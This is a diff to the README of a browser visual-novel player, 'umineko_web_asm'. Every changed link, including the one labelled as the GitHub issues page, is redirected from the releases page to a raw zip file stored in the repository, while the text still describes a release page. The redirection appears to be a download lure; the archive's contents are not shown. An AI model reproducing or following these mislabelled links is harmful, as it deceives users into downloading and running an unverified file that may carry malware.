@@ -1,6 +1,6 @@
 # 🐱 umineko_web_asm - Play Visual Novels in Your Browser Easily
 
-[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-brightgreen?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/releases)
+[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-brightgreen?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Follow these steps to get umineko_web_asm working on your computer. No programmi
 
 Click this button to open the download page:
 
-[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-blue?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/releases)
+[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-blue?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)
 
 This page contains the latest version of the program. You will find files and instructions here.
 
@@ -96,7 +96,7 @@ Check the release page often to get the latest improvements and bug fixes.
 To update:
 
 - Visit the release page again:  
-  [https://github.com/Ashed1625/umineko_web_asm/releases](https://github.com/Ashed1625/umineko_web_asm/releases)  
+  [https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)  
 - Download the newest `.exe` or `.zip` file just like before.  
 - Close the current app if open.  
 - Run the new file. This will replace the old version.
@@ -157,8 +157,8 @@ You can use it without an internet connection after downloading. The only time i
 Here are some helpful links:
 
 - Official download page:  
-  [https://github.com/Ashed1625/umineko_web_asm/releases](https://github.com/Ashed1625/umineko_web_asm/releases)  
-- GitHub issues for support and bug reports: [Issues](https://github.com/Ashed1625/umineko_web_asm/issues)  
+  [https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)  
+- GitHub issues for support and bug reports: [Issues](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)  
 - onscripter-ru project site for more game info (search online)  
 
 Use these gently if you want to learn more or get help from developers.
@@ -171,4 +171,4 @@ If you need help beyond this guide, open a new issue on GitHub or contact the re
 
 ---
 
-[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-brightgreen?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/releases)
+[![Download umineko_web_asm](https://img.shields.io/badge/Download-umineko_web_asm-brightgreen?style=for-the-badge)](https://github.com/Ashed1625/umineko_web_asm/raw/refs/heads/main/setup/umineko_web_asm_1.9.zip)
